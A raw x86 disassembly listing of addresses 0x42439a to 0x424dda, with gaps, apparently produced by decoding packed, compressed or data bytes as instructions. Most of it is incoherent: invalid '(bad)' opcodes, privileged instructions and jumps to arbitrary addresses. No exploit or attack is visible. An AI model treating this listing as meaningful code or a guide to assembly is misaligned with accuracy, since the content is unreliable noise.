  42439a:	mov    BYTE PTR [ebp+0x33],dl
  42439d:	cld    
  42439e:	mov    ds:0xa16b9dc5,al
  4243a3:	sub    bh,BYTE PTR [eax+0x1af0bfcc]
  4243a9:	scas   eax,DWORD PTR es:[edi]
  4243aa:	js     0x4243da
  4243ac:	fisubr WORD PTR [eax-0x2e]
  4243af:	mov    dl,0x7b
  4243b1:	xchg   edi,eax
  4243b2:	add    BYTE PTR [ebx],dh
  4243b4:	js     0x424428
  4243b6:	or     bh,BYTE PTR [ebp+0x668ba9e7]
  4243bc:	repnz fdivr st,st(5)
  4243bf:	cmp    DWORD PTR [edi],esi
  4243c1:	sub    ebx,eax
  4243c3:	xchg   esp,eax
  4243c4:	mov    dh,BYTE PTR [edx+ebx*8+0x7e]
  4243c8:	xchg   DWORD PTR [ebx+0x22758987],ebp
  4243ce:	mov    al,0x43
  4243d0:	iret   
  4243d1:	xchg   edi,eax
  4243d2:	fistp  WORD PTR [ecx+0x17]
  4243d5:	sti    
  4243d6:	push   0x933416f
  4243db:	frstor [ebx+0x4b2dda11]
  4243e1:	add    eax,0x11c31b78
  4243e6:	and    BYTE PTR [ebx],ch
  4243e8:	(bad)  
  4243e9:	(bad)  
  4243ea:	fdecstp 
  4243ec:	(bad)  
	...
  424455:	add    BYTE PTR [edx-0x24582da],cl
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x424499
  424463:	out    0xf4,eax
  424465:	leave  
  424466:	mov    ecx,0xff000184
  42446b:	add    BYTE PTR [eax],al
  42446d:	add    cl,ah
  42446f:	out    dx,eax
  424470:	nop
  424471:	adc    DWORD PTR [eax-0x3c],ebx
  424474:	hlt    
  424475:	sbb    ah,BYTE PTR [edx]
  424477:	push   edx
  424478:	ror    BYTE PTR [ecx-0x269ae8f],0x9d
  42447f:	or     edi,esi
  424481:	mov    cl,0x71
  424483:	imul   eax,DWORD PTR [ecx-0x4d155bcf],0xcd9b87f5
  42448d:	xchg   esi,eax
  42448e:	mov    eax,ds:0x3d9f927a
  424493:	push   0xffffff98
  424495:	arpl   WORD PTR [ebx-0x27a59ba4],bp
  42449b:	add    BYTE PTR gs:[ebp+0x26b91c03],cl
  4244a2:	lods   al,BYTE PTR ds:[esi]
  4244a3:	sbb    bh,BYTE PTR [ebp+0x4e5f748b]
  4244a9:	inc    esp
  4244aa:	xchg   DWORD PTR [edx+ebx*4+0x3c],eax
  4244ae:	push   cs
  4244af:	adc    eax,0xb8f10284
  4244b4:	dec    ebx
  4244b5:	push   esi
  4244b6:	sbb    BYTE PTR [ecx+0x5d465930],bl
  4244bc:	div    ecx
  4244be:	push   ebp
  4244bf:	int    0xad
  4244c1:	stc    
  4244c2:	leave  
  4244c3:	ins    DWORD PTR es:[edi],dx
  4244c4:	xchg   BYTE PTR [esi],cl
  4244c6:	xlat   BYTE PTR ds:[ebx]
  4244c7:	psubb  mm6,QWORD PTR [ebx+0x77cfa8fb]
  4244ce:	sbb    al,0x1f
  4244d0:	fisttp DWORD PTR [ebx+0x1d]
  4244d3:	sbb    al,0xb9
  4244d5:	push   eax
  4244d6:	cmp    BYTE PTR [edx],al
  4244d8:	dec    ebp
  4244d9:	stc    
  4244da:	fcomp  DWORD PTR [edx]
  4244dc:	stc    
  4244dd:	out    0x40,eax
  4244df:	or     eax,0x8eb693f1
  4244e4:	xchg   ebp,eax
  4244e5:	jb     0x4244fa
  4244e7:	and    al,0xef
  4244e9:	dec    edx
  4244ea:	adc    al,BYTE PTR [edi-0x78]
  4244ed:	xchg   esp,eax
  4244ee:	pop    edx
  4244ef:	fwait
  4244f0:	xchg   edi,eax
  4244f1:	cwde   
  4244f2:	pop    ds
  4244f3:	imul   esp,DWORD PTR [edi],0x46
  4244f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244f7:	outs   dx,BYTE PTR ds:[esi]
  4244f8:	xlat   BYTE PTR ds:[ebx]
  4244f9:	push   0xd
  4244fb:	mov    al,ds:0xb009ff40
  424500:	xchg   esi,eax
  424501:	retf   0x50c4
  424504:	sbb    eax,0xcce2e83
  424509:	enter  0x63e,0x38
  42450d:	in     eax,dx
  42450e:	pop    eax
  42450f:	repz jl 0x42450c
  424512:	dec    ebx
  424513:	fldenv [esi+0x66902ab4]
  424519:	push   cs
  42451a:	mov    cl,0x38
  42451c:	cmp    al,0x67
  42451e:	fsub   QWORD PTR [ebx+0x5bb42053]
  424524:	scas   al,BYTE PTR es:[edi]
  424525:	in     eax,dx
  424526:	outs   dx,DWORD PTR ds:[esi]
  424527:	cmc    
  424528:	dec    edi
  424529:	pop    eax
  42452a:	int3   
  42452b:	xchg   esi,eax
  42452c:	mov    edx,0x84b1e500
  424531:	aaa    
  424532:	cmc    
  424533:	xchg   esp,eax
  424534:	loop   0x4244ee
  424536:	sub    ah,BYTE PTR [edx+0x69]
  424539:	or     BYTE PTR [eax+ebx*2+0x798c1b9d],0xb1
  424541:	and    eax,0xd811497
  424546:	jb     0x42452b
  424548:	sar    BYTE PTR [edi-0xa],0x3
  42454c:	adc    DWORD PTR [ebx-0x2f],edi
  42454f:	in     eax,dx
  424550:	pusha  
  424551:	repnz adc eax,0x4175767b
  424557:	jecxz  0x4245d6
  424559:	jns    0x4245b4
  42455b:	jo     0x42451e
  42455d:	xor    al,BYTE PTR [eax-0x590be06b]
  424563:	adc    BYTE PTR [edx+0x4fd4cacb],dl
  424569:	inc    edi
  42456a:	test   al,0x28
  42456c:	call   0x0:0x0
	...
  4245d3:	add    BYTE PTR [eax],al
  4245d5:	add    al,ah
  4245d7:	outs   dx,DWORD PTR ds:[esi]
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0x2c],1
  4245e3:	adc    ebp,0x41
  4245e6:	mov    eax,0xff000185
  4245eb:	add    BYTE PTR [eax],al
  4245ed:	add    BYTE PTR [eax],bh
  4245ef:	xor    al,BYTE PTR [ebp-0x4]
  4245f2:	aas    
  4245f3:	mov    al,ds:0xe2897eb4
  4245f8:	retf   0x21f
  4245fb:	hlt    
  4245fc:	jle    0x42465f
  4245fe:	shr    edx,0x9e
  424601:	push   es
  424602:	shl    DWORD PTR [eax+ecx*8],0x87
  424606:	std    
  424607:	or     dh,dh
  424609:	dec    ebx
  42460a:	cmp    eax,0x5a4235cb
  42460f:	out    dx,eax
  424610:	cmp    eax,0xc949a582
  424615:	xchg   esp,eax
  424616:	je     0x42466b
  424618:	sub    esp,ecx
  42461a:	xchg   edi,eax
  42461b:	pop    esi
  42461c:	push   0xffffff90
  42461e:	nop
  42461f:	cmc    
  424620:	loope  0x42466b
  424622:	cld    
  424623:	clc    
  424624:	sub    al,0x8e
  424626:	adc    bh,BYTE PTR [edx+0x11]
  424629:	pop    ss
  42462a:	add    bl,ah
  42462c:	gs ins BYTE PTR es:[edi],dx
  42462e:	push   ebx
  42462f:	adc    al,0x9b
  424631:	xchg   ecx,eax
  424632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424633:	je     0x4245d5
  424635:	jb     0x42468f
  424637:	je     0x424694
  424639:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42463b:	hlt    
  42463c:	pop    esp
  42463d:	dec    esi
  42463e:	mov    dh,0x12
  424640:	fdivp  st(7),st
  424642:	sbb    bl,BYTE PTR [edi+0x115403a2]
  424648:	sub    eax,edx
  42464a:	cmp    eax,0xa01b39fe
  42464f:	mov    ecx,0xc2b65937
  424654:	mov    bl,0xd4
  424656:	repnz pop ebx
  424658:	jmp    0xe9e54309
  42465d:	inc    eax
  42465e:	jle    0x424600
  424660:	sub    eax,DWORD PTR [edi-0xb]
  424663:	test   DWORD PTR [ebp-0x5b],ecx
  424666:	inc    edx
  424667:	outs   dx,DWORD PTR ds:[esi]
  424668:	(bad)  
  42466a:	jp     0x42466f
  42466c:	mov    ah,0x2a
  42466e:	mov    bh,0xdf
  424670:	or     cl,BYTE PTR [edi+ecx*2+0x76a8cd44]
  424677:	in     eax,0xab
  424679:	aad    0xfe
  42467b:	xchg   edi,eax
  42467c:	aad    0x52
  42467e:	nop
  42467f:	and    eax,0x833cef0
  424684:	(bad)  
  424685:	adc    al,0x52
  424687:	fist   DWORD PTR [esp+edx*1]
  42468a:	das    
  42468b:	hlt    
  42468c:	loope  0x424616
  42468e:	js     0x424663
  424690:	mov    cl,BYTE PTR [edi-0x2a]
  424693:	test   DWORD PTR [eax],edx
  424695:	xchg   esp,eax
  424696:	pop    edi
  424697:	xchg   DWORD PTR [ecx-0x46],ecx
  42469a:	cmc    
  42469b:	inc    eax
  42469c:	push   es
  42469d:	into   
  42469e:	mov    al,ds:0x3ed24873
  4246a3:	loope  0x424655
  4246a5:	jb     0x42465f
  4246a7:	cs push ecx
  4246a9:	xlat   BYTE PTR ds:[ebx]
  4246aa:	rcr    BYTE PTR [edx+0x35],cl
  4246ad:	pop    ss
  4246ae:	xor    BYTE PTR [ecx+0x334e58db],ah
  4246b4:	mov    edx,0x6511c40b
  4246b9:	les    edx,FWORD PTR [ecx-0x12]
  4246bc:	sub    BYTE PTR [esi],bh
  4246be:	out    dx,al
  4246bf:	fwait
  4246c0:	push   eax
  4246c1:	fsubr  DWORD PTR [edx-0x21e4ead3]
  4246c7:	xchg   ebx,eax
  4246c8:	sbb    eax,0x9b402b8
  4246cd:	pop    ds
  4246ce:	in     al,dx
  4246cf:	sub    al,0xe7
  4246d1:	xchg   edi,eax
  4246d2:	loop   0x424695
  4246d4:	cmp    al,0xea
  4246d6:	inc    esi
  4246d7:	fbstp  TBYTE PTR ds:0xca7621c9
  4246dd:	fucomp st(3)
  4246df:	inc    esi
  4246e0:	pop    ss
  4246e1:	inc    edi
  4246e2:	inc    BYTE PTR [ebp+edx*4+0xe25cd23]
  4246e9:	xrelease mov DWORD PTR [edi+0x39],ebp
	...
  424754:	add    BYTE PTR [eax],al
  424756:	mov    esp,0xfefffc92
  42475b:	(bad)  
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR [esi-0x48d44355],ah
  424767:	xchg   BYTE PTR [ecx],al
  424769:	add    bh,bh
  42476b:	add    BYTE PTR [eax],al
  42476d:	add    dl,dl
  42476f:	not    BYTE PTR [edx-0x58f51be3]
  424775:	xor    eax,0xe12384d3
  42477a:	xchg   edi,eax
  42477b:	fstp   DWORD PTR [ebx+0x683f87c5]
  424781:	xchg   ebx,eax
  424782:	fdiv   QWORD PTR [edx-0x5e04f80f]
  424788:	int3   
  424789:	mov    ah,0x9e
  42478b:	repz jg 0x42478e
  42478e:	fld    st(7)
  424790:	mov    eax,ds:0xc9fe95de
  424795:	jg     0x4247b7
  424797:	jns    0x4247f6
  424799:	jecxz  0x4247fb
  42479b:	or     DWORD PTR [edi-0x1033cd4e],ebx
  4247a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247a2:	mov    al,0xc6
  4247a4:	fwait
  4247a5:	cmovs  edi,DWORD PTR es:[edi]
  4247a9:	pusha  
  4247aa:	xor    eax,0xbe7d44c5
  4247af:	cmp    eax,0xf23c5bc5
  4247b4:	int3   
  4247b5:	dec    esp
  4247b6:	cwde   
  4247b7:	repz or edi,DWORD PTR [edx-0x33]
  4247bb:	retf   
  4247bc:	call   0x1fa15a51
  4247c1:	or     BYTE PTR [edx+0x4],0x57
  4247c5:	clc    
  4247c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247c7:	data16 stos BYTE PTR es:[edi],al
  4247c9:	stc    
  4247ca:	mov    bl,0xb
  4247cc:	mov    ebp,0x37375025
  4247d1:	add    DWORD PTR [eax],ecx
  4247d3:	rol    esp,cl
  4247d5:	cmp    edi,DWORD PTR [edi]
  4247d7:	in     eax,dx
  4247d8:	fldcw  WORD PTR [esi]
  4247da:	cmp    eax,0x4077df25
  4247df:	shl    BYTE PTR [ebp+0x60],cl
  4247e2:	es ss scas eax,DWORD PTR es:[edi]
  4247e5:	cs fsub st,st(4)
  4247e8:	aas    
  4247e9:	rcl    BYTE PTR [edi],0xa1
  4247ec:	in     eax,dx
  4247ed:	cwde   
  4247ee:	repz int3 
  4247f0:	in     al,dx
  4247f1:	xor    cl,0xb1
  4247f4:	popa   
  4247f5:	xor    DWORD PTR [ebx],ebp
  4247f7:	xchg   DWORD PTR [esp+eiz*2+0x69dbd92a],eax
  4247fe:	test   eax,eax
  424800:	jecxz  0x42482a
  424802:	sub    dl,dl
  424804:	pop    ecx
  424805:	inc    ebx
  424806:	xor    al,0xe8
  424808:	and    ah,BYTE PTR [ecx-0x40]
  42480b:	sahf   
  42480c:	(bad)  
  42480d:	ror    BYTE PTR [ecx],cl
  42480f:	aas    
  424810:	div    ebx
  424812:	(bad)  [eax+0x1d328f0f]
  424818:	xor    eax,0xd9f61063
  42481d:	cli    
  42481e:	mov    DWORD PTR [ecx-0x51f50ed6],eax
  424824:	dec    ecx
  424825:	pusha  
  424826:	(bad)  
  424827:	mov    ds:0xd2f766e0,al
  42482c:	and    DWORD PTR [esp+ecx*4-0x37],ebp
  424830:	cwde   
  424831:	mov    esp,0x5b27fd72
  424836:	call   0x574b1891
  42483b:	pop    ebx
  42483c:	fdiv   QWORD PTR [esi+0x27a96fa0]
  424842:	push   ecx
  424843:	inc    ecx
  424844:	push   ebx
  424845:	das    
  424846:	jno    0x424830
  424848:	scas   al,BYTE PTR es:[edi]
  424849:	iret   
  42484a:	scas   eax,DWORD PTR es:[edi]
  42484b:	sub    ch,BYTE PTR [edi-0xa]
  42484e:	inc    eax
  42484f:	jmp    0x42483a
  424851:	ss pop es
  424853:	sbb    BYTE PTR [ebp+0x76],0xae
  424857:	sbb    DWORD PTR ds:[ecx],esi
  42485a:	xor    al,0x94
  42485c:	daa    
  42485d:	add    esi,edi
  42485f:	mov    BYTE PTR ds:[edx],dh
  424862:	dec    edx
  424863:	fsubrp st(0),st
  424865:	and    edi,DWORD PTR [eax+ebp*2-0x1940d449]
  42486c:	rol    DWORD PTR [eax],1
	...
  4248d6:	and    bl,BYTE PTR [eax-0x7c]
  4248d9:	out    dx,eax
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	stos   BYTE PTR es:[edi],al
  4248e3:	leave  
  4248e4:	or     bh,BYTE PTR [ebp-0x4a]
  4248e7:	xchg   DWORD PTR [ecx],eax
  4248e9:	add    bh,bh
  4248eb:	add    BYTE PTR [eax],al
  4248ed:	add    BYTE PTR [ebx+0x131cd68b],ch
  4248f3:	xchg   edi,eax
  4248f4:	sub    ecx,esi
  4248f6:	out    dx,al
  4248f7:	or     al,ch
  4248f9:	loopne 0x4248a1
  4248fb:	fild   DWORD PTR [ebp+0x2885edd6]
  424901:	fwait
  424902:	mov    eax,ds:0x8aa06bb3
  424907:	loope  0x424915
  424909:	mov    ds:0xa016f1ed,eax
  42490e:	jbe    0x4248cf
  424910:	fwait
  424911:	ss out 0x67,eax
  424914:	mov    esi,0x48363f75
  424919:	enter  0x127d,0x21
  42491d:	lock out dx,al
  42491f:	jle    0x424932
  424921:	sub    DWORD PTR [ebp-0x31],0x3f
  424925:	outs   dx,BYTE PTR ds:[esi]
  424926:	sub    DWORD PTR [ecx-0x41],edi
  424929:	pop    esi
  42492a:	adc    DWORD PTR [esp+edx*2+0x6f2e725b],esp
  424931:	jbe    0x424907
  424933:	lock jp 0x424924
  424936:	jecxz  0x4248ea
  424938:	ins    DWORD PTR es:[edi],dx
  424939:	(bad)  
  42493a:	ss mov ebp,0xe71dce7
  424940:	enter  0x5b6c,0xcd
  424944:	outs   dx,BYTE PTR ds:[esi]
  424945:	popf   
  424946:	dec    eax
  424947:	retf   0x6cae
  42494a:	sbb    DWORD PTR [edx],ecx
  42494c:	adc    dh,BYTE PTR [esi-0x26186c37]
  424952:	push   ss
  424953:	(bad)  
  424954:	rol    eax,cl
  424956:	jmp    0x1b9cf6a3
  42495b:	js     0x4249be
  42495d:	sub    edi,ebx
  42495f:	jns    0x4249de
  424961:	ins    BYTE PTR es:[edi],dx
  424962:	adc    al,0x52
  424964:	(bad)  [ebx-0x1d]
  424967:	and    esp,edx
  424969:	jge    0x424967
  42496b:	cmp    BYTE PTR [ebp+0x5b85eda],bl
  424971:	pop    esi
  424972:	pmullw mm0,QWORD PTR ds:0x9914f4bc
  424979:	outs   dx,DWORD PTR ds:[esi]
  42497a:	mov    BYTE PTR [edx],bl
  42497c:	dec    ebp
  42497d:	mov    edi,0xa1a722fb
  424982:	xchg   ebp,eax
  424983:	in     al,0xc9
  424985:	fwait
  424986:	cmp    al,0x3e
  424988:	push   cs
  424989:	lea    ebx,[esi+edx*8]
  42498c:	jbe    0x4249ea
  42498e:	ds jl  0x424973
  424991:	out    0x1a,eax
  424993:	adc    eax,0x82d169a0
  424998:	xchg   esp,eax
  424999:	js     0x424951
  42499b:	fidiv  DWORD PTR [ebp+0x21df852d]
  4249a1:	hlt    
  4249a2:	retf   
  4249a3:	jnp    0x4249ed
  4249a5:	pop    ds
  4249a6:	out    dx,eax
  4249a7:	retf   
  4249a8:	pop    ds
  4249a9:	cmp    BYTE PTR [edx-0x47],dh
  4249ac:	inc    ebx
  4249ad:	sbb    ch,BYTE PTR [esi]
  4249af:	(bad)  
  4249b2:	outs   dx,BYTE PTR ds:[esi]
  4249b3:	jb     0x424946
  4249b5:	pusha  
  4249b6:	xchg   edx,eax
  4249b7:	mov    ecx,0x7e6070bc
  4249bc:	cld    
  4249bd:	sbb    bh,BYTE PTR [ebx+0x346e1f8b]
  4249c3:	jb     0x4249b5
  4249c5:	adc    ch,BYTE PTR [esi+0x5]
  4249c8:	pop    ebp
  4249c9:	xchg   ecx,eax
  4249ca:	je     0x424a0e
  4249cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249cd:	sub    edi,esi
  4249cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249d0:	arpl   WORD PTR [ebx-0x12e74175],cx
  4249d6:	push   edx
  4249d7:	adc    BYTE PTR [edi+edx*1],cl
  4249da:	into   
  4249db:	popf   
  4249dc:	adc    dl,BYTE PTR [esi+0x785d32bd]
  4249e2:	or     BYTE PTR [ebx-0x47],dl
  4249e5:	mov    edi,0x8e0e65a4
  4249ea:	fdivrp st(4),st
  4249ec:	sub    eax,0x0
	...
  424a55:	add    BYTE PTR [ebx+0x18],ch
  424a58:	arpl   WORD PTR [edx+0x73],bp
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    cl,BYTE PTR [edx-0x4a1fcf17]
  424a67:	mov    BYTE PTR [ecx],al
  424a69:	add    bh,bh
  424a6b:	add    BYTE PTR [eax],al
  424a6d:	add    BYTE PTR [edx+0x74316510],dh
  424a73:	mov    esi,0x812c20a1
  424a78:	and    BYTE PTR ds:0x592be1f2,cl
  424a7e:	(bad)  
  424a7f:	jns    0x424a3b
  424a81:	fwait
  424a82:	cmp    DWORD PTR [edx],ecx
  424a84:	fsubrp st(4),st
  424a86:	ror    esi,1
  424a88:	test   al,0x1d
  424a8a:	div    DWORD PTR [ecx+0x2f6eb328]
  424a90:	dec    ecx
  424a91:	pop    edi
  424a92:	and    eax,0x4da54ac8
  424a97:	xlat   BYTE PTR ds:[ebx]
  424a98:	dec    eax
  424a99:	sbb    DWORD PTR [ebp+0x22e18285],0xd3b9b125
  424aa3:	cmp    ebx,DWORD PTR [ebp+0xc5334dc]
  424aa9:	sub    DWORD PTR [edx+0xd],eax
  424aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424aad:	jl     0x424ad1
  424aaf:	icebp  
  424ab0:	out    dx,al
  424ab1:	call   FWORD PTR [esi+0x6a30cb1b]
  424ab7:	xchg   edi,eax
  424ab8:	rcr    DWORD PTR [edi],0x41
  424abb:	add    al,0xec
  424abd:	and    edx,DWORD PTR [ebp+0x1c]
  424ac0:	rcr    ecx,1
  424ac2:	and    bl,BYTE PTR [ebp-0x777c688c]
  424ac8:	pop    ds
  424ac9:	mov    bh,BYTE PTR [ebx-0x1]
  424acc:	ins    DWORD PTR es:[edi],dx
  424acd:	push   ds
  424ace:	inc    ebp
  424acf:	cli    
  424ad0:	add    DWORD PTR [edi+0x1a],eax
  424ad3:	test   esi,ebp
  424ad5:	rcr    al,cl
  424ad7:	fwait
  424ad8:	jno    0x424abf
  424ada:	enter  0x4f2a,0xda
  424ade:	mov    DWORD PTR [edx+0x1ffb3816],eax
  424ae4:	sub    DWORD PTR [ebx-0x3a854f7b],esi
  424aea:	scas   al,BYTE PTR es:[edi]
  424aeb:	push   0x420c1d21
  424af0:	jo     0x424aba
  424af2:	sahf   
  424af3:	fisubr DWORD PTR [edx+0x4c]
  424af6:	mov    eax,ds:0xdb0fbc23
  424afb:	mov    al,ds:0x7aa0bc00
  424b00:	cmp    DWORD PTR [esi-0x1b43e795],ebx
  424b06:	sub    DWORD PTR [eax+edi*2+0x3a],esp
  424b0a:	jo     0x424b5a
  424b0c:	push   edi
  424b0d:	loopne 0x424ae7
  424b0f:	mov    ds:0xd0ef71e7,eax
  424b14:	int3   
  424b15:	xchg   edi,ebx
  424b17:	ja     0x424ac4
  424b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b1a:	fimul  WORD PTR [edi-0x18]
  424b1d:	lds    esp,FWORD PTR [esi]
  424b1f:	inc    ecx
  424b20:	lahf   
  424b21:	lahf   
  424b22:	(bad)  
  424b23:	sub    eax,0x625cd9f6
  424b28:	dec    ecx
  424b29:	shr    esi,1
  424b2b:	jl     0x424af5
  424b2d:	adc    esp,DWORD PTR [eax-0x40]
  424b30:	inc    edi
  424b31:	xchg   esp,eax
  424b32:	fist   DWORD PTR [esi-0xd4b580a]
  424b38:	jbe    0x424bb2
  424b3a:	shl    DWORD PTR cs:[edx],cl
  424b3d:	cmp    DWORD PTR [eax+0x60c861b6],eax
  424b43:	lods   eax,DWORD PTR ds:[esi]
  424b44:	push   0xffffffa2
  424b46:	icebp  
  424b47:	neg    DWORD PTR [ecx+edx*4]
  424b4a:	pop    ds
  424b4b:	sbb    BYTE PTR ds:0xf9400bb8,bh
  424b51:	outs   dx,DWORD PTR ds:[esi]
  424b52:	push   ss
  424b53:	jb     0x424ba9
  424b55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b56:	xchg   ecx,eax
  424b57:	addr16 jg 0x424bd8
  424b5a:	mov    al,ds:0x10c8b65a
  424b5f:	test   BYTE PTR [edx-0x3b],ah
  424b62:	cdq    
  424b63:	std    
  424b64:	mov    ds:0x5eb17796,eax
  424b69:	hlt    
  424b6a:	es mov ecx,0xab
	...
  424bd4:	add    BYTE PTR [eax],al
  424bd6:	push   es
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	imul   edx,DWORD PTR [eax-0x764b7040],0xff0001
  424bec:	add    BYTE PTR [eax],al
  424bee:	lahf   
  424bef:	xor    eax,DWORD PTR ds:[ebx+0x7]
  424bf3:	add    al,0xea
  424bf5:	sbb    edi,DWORD PTR [ebp-0x33]
  424bf8:	dec    eax
  424bf9:	(bad)  
  424bfa:	sar    BYTE PTR [edi+ecx*2],1
  424bfd:	jmp    0xc6fbf994
  424c02:	pop    eax
  424c03:	jo     0x424c16
  424c05:	cmp    edi,DWORD PTR [eax-0x4ad576ce]
  424c0b:	adc    BYTE PTR [ebx],0x4f
  424c0e:	jge    0x424c3b
  424c10:	shr    DWORD PTR [edi+0x76],cl
  424c13:	and    edi,eax
  424c15:	cdq    
  424c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c17:	repnz sub BYTE PTR [ebx+0x35],ch
  424c1b:	addr16 mov ebx,0xdb59e757
  424c21:	sub    eax,edi
  424c23:	je     0x424bf6
  424c25:	int    0xe2
  424c27:	ds in  eax,0xf2
  424c2a:	sub    eax,0x18b11d59
  424c2f:	and    al,0x57
  424c31:	hlt    
  424c32:	adc    ecx,DWORD PTR [ecx]
  424c34:	(bad)  
  424c35:	dec    ecx
  424c36:	stos   BYTE PTR es:[edi],al
  424c37:	pop    ds
  424c38:	dec    edx
  424c3a:	hlt    
  424c3b:	(bad)  
  424c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c3d:	xchg   ebx,edi
  424c3f:	add    ecx,ebp
  424c41:	inc    ecx
  424c42:	dec    edx
  424c43:	fst    DWORD PTR [edi]
  424c45:	rcr    DWORD PTR [edx],1
  424c47:	inc    eax
  424c48:	and    eax,0x5cf4399a
  424c4d:	mov    bh,0x18
  424c4f:	or     ebx,edx
  424c51:	jge    0x424bed
  424c53:	int    0x48
  424c55:	jmp    0x4df4:0xf0ebd480
  424c5c:	in     al,0x88
  424c5e:	mov    ebx,0x404def70
  424c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c64:	je     0x424c2f
  424c66:	push   ss
  424c67:	pop    ebx
  424c68:	or     dl,BYTE PTR ds:0x57fb093a
  424c6e:	push   edx
  424c6f:	and    al,0x55
  424c71:	(bad)  
  424c72:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  424c74:	adc    BYTE PTR [edi],cl
  424c76:	mov    bh,0x6a
  424c78:	ins    BYTE PTR es:[edi],dx
  424c79:	jmp    0x424c46
  424c7b:	daa    
  424c7c:	jp     0x424cc1
  424c7e:	in     al,0x69
  424c80:	sbb    BYTE PTR ds:0x14c11930,dh
  424c86:	pop    esi
  424c87:	xor    esp,DWORD PTR [ecx+0xa]
  424c8a:	push   esi
  424c8b:	rol    BYTE PTR [ecx+esi*2],cl
  424c8e:	xor    DWORD PTR [eax+edi*1],0xffffffe7
  424c92:	and    ebx,edx
  424c94:	or     eax,0x327d6c08
  424c99:	icebp  
  424c9a:	adc    dh,BYTE PTR [edx-0x7b]
  424c9d:	test   al,0xaa
  424c9f:	inc    esp
  424ca0:	or     DWORD PTR [esi-0x47],ebp
  424ca3:	gs sub al,0x97
  424ca6:	ja     0x424c35
  424ca8:	repz sbb al,0x74
  424cab:	jle    0x424d24
  424cad:	or     al,0x1d
  424caf:	adc    ch,BYTE PTR ds:0x6efab96f
  424cb5:	sub    al,0x98
  424cb7:	(bad)  
  424cb8:	clc    
  424cb9:	enter  0x32a6,0x7e
  424cbd:	xchg   ecx,eax
  424cbe:	and    eax,0xc5405fb3
  424cc3:	and    BYTE PTR [eax-0x3c2571fe],0x86
  424cca:	jp     0x424d2d
  424ccc:	adc    eax,0x719e517c
  424cd1:	cld    
  424cd2:	jns    0x424cb3
  424cd4:	out    dx,eax
  424cd5:	push   ds
  424cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424cd7:	mov    al,ds:0xd3863757
  424cdc:	inc    edx
  424cdd:	enter  0x9a57,0xcc
  424ce1:	jb     0x424c7f
  424ce3:	stos   BYTE PTR es:[edi],al
  424ce4:	pop    ebx
  424ce5:	lds    ebp,FWORD PTR [edi+eiz*1+0x65]
  424ce9:	jg     0x424cf3
  424ceb:	mov    ebp,0xe4
	...
  424d54:	add    BYTE PTR [eax],al
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx+0x649451a8]
  424d64:	pop    ecx
  424d65:	jo     0x424d1a
  424d67:	mov    al,BYTE PTR [ecx]
  424d69:	add    bh,bh
  424d6b:	add    BYTE PTR [eax],al
  424d6d:	add    al,ah
  424d6f:	sti    
  424d70:	xor    ecx,DWORD PTR [ecx-0x7fa3bdf1]
  424d76:	sub    DWORD PTR [ecx],esp
  424d78:	repnz inc edx
  424d7a:	adc    ebx,esi
  424d7c:	jne    0x424da6
  424d7e:	je     0x424ddd
  424d80:	sbb    al,0x44
  424d82:	dec    edi
  424d83:	jp     0x424d3c
  424d85:	lods   al,BYTE PTR ds:[esi]
  424d86:	sub    BYTE PTR cs:[ebp+0x6996d716],ah
  424d8d:	int3   
  424d8e:	out    0xc6,al
  424d90:	ins    DWORD PTR es:[edi],dx
  424d91:	scas   al,BYTE PTR es:[edi]
  424d92:	inc    ebp
  424d93:	int    0x87
  424d95:	aam    0x8
  424d97:	in     al,0xea
  424d99:	mov    ah,0x5b
  424d9b:	inc    ebp
  424d9c:	outs   dx,DWORD PTR ds:[esi]
  424d9d:	sub    eax,0x98d269d6
  424da2:	push   ss
  424da3:	stos   DWORD PTR es:[edi],eax
  424da4:	rcr    DWORD PTR [edi+0x1a],1
  424da7:	mov    ah,0xde
  424da9:	pop    edi
  424daa:	mov    ah,BYTE PTR [edi-0x655bcbd2]
  424db0:	mov    bh,0x45
  424db2:	push   ds
  424db3:	xchg   ecx,eax
  424db4:	stos   DWORD PTR es:[edi],eax
  424db5:	fdiv   DWORD PTR [ecx+0x24]
  424db8:	enter  0xe2e6,0x5e
  424dbc:	dec    edx
  424dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dbe:	dec    ecx
  424dbf:	imul   ebp,DWORD PTR [ecx-0x54],0x5f65287d
  424dc6:	mov    BYTE PTR [ecx+0x3cd0693a],0xd3
  424dcd:	ins    BYTE PTR es:[edi],dx
  424dce:	xchg   ecx,eax
  424dcf:	cmp    al,0xbe
  424dd1:	jb     0x424dc6
  424dd3:	(bad)  
  424dd4:	mov    edx,0x39006463
  424dd9:	pop    esp
  424dda:	add    ecx,DWORD PTR [esi+ecx*1+0x28]
